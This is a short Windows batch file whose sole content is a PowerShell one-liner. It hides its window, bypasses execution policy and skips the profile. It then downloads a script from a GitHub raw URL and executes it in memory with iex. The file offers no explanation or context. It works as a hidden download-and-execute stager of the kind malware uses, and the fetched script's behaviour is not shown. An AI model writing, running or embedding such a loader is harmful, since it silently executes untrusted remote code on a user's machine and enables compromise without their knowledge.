@echo off
setlocal

powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -c "iex (iwr 'https://raw.githubusercontent.com/engine34r/knocker/main/grnz.ps1' -UseBasicParsing).Content"

endlocal